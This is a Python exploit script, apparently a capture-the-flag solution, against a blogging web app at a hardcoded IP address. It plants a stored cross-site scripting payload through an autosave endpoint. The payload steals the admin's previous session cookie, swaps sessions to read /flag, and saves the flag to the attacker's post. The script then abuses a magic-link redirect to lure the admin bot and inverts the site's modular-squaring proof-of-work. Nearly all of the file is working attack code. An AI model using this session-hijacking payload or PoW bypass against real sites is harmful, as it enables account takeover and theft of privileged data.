
import requests
import re
import time

BASE_URL = "http://34.26.148.28:5000/"
USERNAME = "attacker"
PASSWORD = "password"

s = requests.Session()

def register():
    print("[*] Registering...")
    r = s.post(f"{BASE_URL}/register", data={"username": USERNAME, "password": PASSWORD})
    if r.status_code == 200 and "Login" in r.text:
        print("[+] Registration successful")
    elif "already exists" in r.text:
        print("[*] User already exists")
    else:
        print("[-] Registration failed")

def login():
    print("[*] Logging in...")
    r = s.post(f"{BASE_URL}/login", data={"username": USERNAME, "password": PASSWORD})
    if "sid" in s.cookies:
        print("[+] Login successful")
        return True
    print("[-] Login failed")
    return False

def create_post():
    print("[*] Creating post...")
    # GET /edit creates a new post and redirects
    r = s.get(f"{BASE_URL}/edit", allow_redirects=True)
    # The URL should be /edit/<id>
    # or the content contains the id
    match = re.search(r'/edit/(\d+)', r.url)
    if not match:
        match = re.search(r'Post (\d+)', r.text)
    
    if match:
        pid = match.group(1)
        print(f"[+] Created Post ID: {pid}")
        return pid
    print("[-] Failed to get Post ID")
    return None

def inject_payload(pid):
    print(f"[*] Injecting payload into Post {pid}...")
    
    # We need to explicitly use the payload that swaps cookies, 
    # gets the flag, swaps back, and saves the flag to OUR post.
    payload = f"""<script>
    (async () => {{
        try {{
            const cookies = document.cookie;
            const prevSidMatch = cookies.match(/sid_prev=([a-f0-9]+)/);
            if (prevSidMatch) {{
                const adminSid = prevSidMatch[1];
                const mySidMatch = cookies.match(/sid=([a-f0-9]+)/);
                const mySid = mySidMatch ? mySidMatch[1] : '';

                // Swap to admin
                document.cookie = "sid=" + adminSid + "; path=/";
                
                // Get Flag
                const res = await fetch('/flag');
                const flag = await res.text();

                // Swap back to us
                document.cookie = "sid=" + mySid + "; path=/";
                
                // Save flag to THIS post ({pid})
                await fetch('/api/save', {{
                    method: 'POST',
                    headers: {{'Content-Type': 'application/json'}},
                    body: JSON.stringify({{postId: {pid}, content: flag}})
                }});
            }}
        }} catch (e) {{ console.log(e); }}
    }})();
    </script>"""

    r = s.post(f"{BASE_URL}/api/autosave", json={"postId": int(pid), "content": payload})
    if r.json().get('ok'):
        print("[+] Payload injected successfully via autosave")
    else:
        print("[-] Injection failed")

def get_magic_token():
    print("[*] Generating magic token...")
    s.post(f"{BASE_URL}/magic/generate")
    r = s.get(f"{BASE_URL}/account")
    # Identify the token
    # <a href="/magic/TOKEN">
    match = re.findall(r'/magic/([a-f0-9]+)', r.text)
    if match:
        # Get the latest one
        token = match[-1]
        print(f"[+] Magic Token: {token}")
        return token
    print("[-] Failed to get magic token")
    return None

def report_to_bot(token, pid):
    target_url = f"http://localhost:3000/magic/{token}?redirect=/edit/{pid}"
    print(f"[*] Reporting URL to bot: {target_url}")
    
    # We need to bypass PoW? 
    # The server code says: const POW_ENABLED = Number.isFinite(POW_DIFFICULTY) && POW_DIFFICULTY > 0;
    # Default POW_DIFFICULTY is 5000.
    # So PoW IS enabled.
    
    # We need to solve PoW.
    # Check if /report asks for PoW
    r = s.get(f"{BASE_URL}/report")
    challenge_match = re.search(r'name="pow_challenge"\s+value="([^"]+)"', r.text)
    
    pow_solution = ""
    if challenge_match:
        challenge = challenge_match.group(1)
        print(f"[*] Found PoW challenge: {challenge}")
        pow_solution = solve_pow(challenge)
        print(f"[+] PoW Solution: {pow_solution}")
    else:
        print("[*] No PoW challenge found")

    data = {
        "url": target_url,
        "pow_challenge": challenge if challenge_match else "",
        "pow_solution": pow_solution
    }
    
    r = s.post(f"{BASE_URL}/report", data=data)
    if "Admin is on the way" in r.text or "started" in r.text:
        print("[+] Bot reported successfully")
        return True
    
    print("[-] Report failed")
    # Debug
    # print(r.text)
    return False

def solve_pow(challenge):
    # Challenge format: s.base64_diff.base64_x
    # We need to find y such that (y^2) ^ difficulty ... NO
    # Logic in server.js:
    # current = y;
    # for (i=0; i<difficulty; i++) { current = (current ^ 1); current = (current * current) % MOD; }
    # if (current == x || current == MOD - x) return true;
    
    # This is a reverse Puzzle? No, we check the solution.
    # We need to FIND y.
    # This looks like modular square root sequences?
    # Actually, it's iterating square ops.
    # "Time-lock puzzle" or similar.
    # Wait, 5000 iterations is small.
    # But we need to find y such that f(y) = x.
    # This is inverting a sequence of squares.
    # Square roots modulo prime are hard?
    # MOD = (1<<1279) - 1. Merseinne prime M1279.
    # Computing square roots modulo a prime is done via Tonelli-Shanks.
    # But we have 5000 iterations.
    
    # Wait, look at the verification:
    # for i in range(difficulty): y = (y^1); y = (y*y) % MOD;
    # We know x (the target).
    # We presumably need to work BACKWARDS?
    # Inverse of y^2 % P is sqrt(y) % P.
    # Inverse of y^1 is y^1 (XOR is its own inverse).
    
    # So we need to chain square roots.
    # M1279 is a prime.
    # Sqrt mod P exists if legendre symbol is 1.
    # There are two roots.
    # This seems computationally heavy for Python if not optimized, but 5000 steps?
    # Maybe difficulty is small enough.
    
    # But wait, why would they make us do 5000 square roots?
    # Usually PoW is brute force (hash collision).
    # This is "Proof of Work" based on modular squaring.
    # It might be a Verifiable Delay Function (VDF)?
    # No, VDFs are usually "calculate forward is slow, verify is fast".
    # Here, `powCheck` does the forward calculation.
    # So WE (the client) need to provide `solution` (y) such that `forward(y) == x`.
    # AND the server generated x?
    # `xBytes = crypto.randomBytes(16);`
    # `x` is random.
    # So we simply need to find the Preimage?
    # Reversing 5000 modular squares is HARD.
    # Unless I misread `powCheck`.
    
    # "powGenerateChallenge":
    # returns challenge string.
    # Just that. It doesn't compute y.
    
    # Wait.
    # "Time-lock puzzle":
    # Usually: S = T^ (2^t) mod N.
    # If the server doesn't know the factorization of N, it can't create the solution quickly?
    # But here N is a known prime.
    # If N is prime, we can compute roots.
    
    # Is it possible the server expects US to brute force?
    # No, random 128-bit numbers (bytes to big int).
    
    # Let's re-read carefully.
    # `powCheck(challenge, solution, expectedDifficulty)`
    # `decoded = powDecodeChallenge(challenge)` -> gets `x`.
    # `y = powDecodeSolution(solution)`
    # `current = y`
    # Loop `difficulty` times:
    #   `current = current ^ 1`
    #   `current = current * current % MOD`
    # check `current == x`.
    
    # So we need to find y.
    # This IS reversing the operation.
    # If MOD is prime, Square Root is easy-ish (O(log^3 MOD)).
    # 5000 times O(1279 bits ops) is feasible.
    
    return solve_pow_internal(challenge)

def solve_pow_internal(challenge):
    decoded = parse_challenge(challenge)
    difficulty = decoded['difficulty']
    x = decoded['x']
    
    # MOD = (1<<1279) - 1
    MOD = (1 << 1279) - 1
    
    # We need to go backwards 'difficulty' times.
    # Forward: v -> (v^1)^2
    # Backward: v -> sqrt(v) ^ 1
    
    curr = x
    for i in range(difficulty):
        # Sqrt
        # We need z such that z^2 = curr (mod P).
        # P = 2^1279 - 1.
        # P = 3 (mod 4).
        # Because 2^k is divisible by 4 for k>=2.
        # 2^1279 = 0 mod 4?
        # 2^1279 ends in ...
        # Actually 2^n mod 4 is 0 for n>=2.
        # So P = 0 - 1 = -1 = 3 (mod 4).
        # YES. P = 3 mod 4.
        
        # For P = 3 mod 4, sqrt(a) = a^((P+1)/4) mod P.
        # We need to check if 'curr' is a quadratic residue.
        # Legendre symbol (curr/P).
        # If not, try (MOD - x) as mentioned in valid check?
        # "return current === decoded.x || current === (POW_MOD - decoded.x);"
        # So if one path fails, maybe the other works?
        # But we are walking backwards FROM x.
        # So we have x. We need to find PREVIOUS.
        # PREVIOUS^2 = x OR PREVIOUS^2 = -x.
        # So we check if x is QR. If not, check -x.
        
        # P+1 = 1<<1279.
        # (P+1)/4 = 1<<1277.
        # So root = x^(2^1277) mod P.
        
        exp = 1 << 1277
        root = pow(curr, exp, MOD)
        
        # Verify
        if pow(root, 2, MOD) != curr:
             # Try -curr
             curr2 = MOD - curr
             root = pow(curr2, exp, MOD)
             if pow(root, 2, MOD) != curr2:
                 print(f"[-] Failed to find root at step {i}")
                 return "0"
        
        # XOR 1
        curr = root ^ 1
    
    # Convert curr to bytes -> base64
    # The `powDecodeSolution` expects `s.base64_y`.
    
    # hex string
    h = hex(curr)[2:]
    if len(h) % 2 != 0: h = '0' + h
    import base64
    b = base64.b64encode(bytes.fromhex(h)).decode()
    return f"s.{b}"

def parse_challenge(c):
    parts = c.split('.')
    dBytes = base64.b64decode(parts[1])
    diff = int.from_bytes(dBytes, 'big')
    xBytes = base64.b64decode(parts[2])
    x = int.from_bytes(xBytes, 'big')
    # Make sure x is positive?
    return {'difficulty': diff, 'x': x}

import base64

if __name__ == "__main__":
    register()
    if login():
        pid = create_post()
        if pid:
            inject_payload(pid)
            token = get_magic_token()
            if token:
                report_to_bot(token, pid)
                print("[*] Waiting for bot...")
                for i in range(10):
                    time.sleep(2)
                    print(f"[*] Checking post content (Attempt {i+1})...")
                    r = s.get(f"{BASE_URL}/post/{pid}")
                    if "uoftctf" in r.text: # Assuming flag format
                         # Extract flag
                         # It will be in the content, but sanitized?
                         # Wait, we wrote it to 'savedContent'.
                         # Which is sanitized.
                         # The flag format usually contains strict chars {}.
                         # DOMPurify shouldn't strip simple text.
                         # But let's look for known prefix.
                         print("Found Flag in response!")
                         # Simple extraction
                         # The content is usually in <div class="rich-content">...</div>
                         print(r.text)
                         break
                else:
                    print("[-] Timed out waiting for flag")

